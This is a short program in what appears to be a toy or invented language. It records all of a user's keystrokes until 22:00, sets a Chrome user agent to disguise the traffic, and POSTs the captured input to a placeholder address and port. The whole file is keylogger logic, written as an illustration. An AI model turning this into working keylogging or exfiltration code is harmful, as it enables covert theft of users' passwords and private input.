use system; @ Imports exit
use keyboard; @ Imports log
use network; @ Imports POST
use time; @ Imports until

main:{
 wait:(time.until("22:00")){ @ Waits until 22:00 today before exiting
  info := keyboard.log(); @ Logs everything the user enters
 }

 network.set_user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"); @ Updates the user agent for this request
 network.POST("address", "port", info); @ Will send whatever the user entered 

 system.exit(); @ Exits the program
}
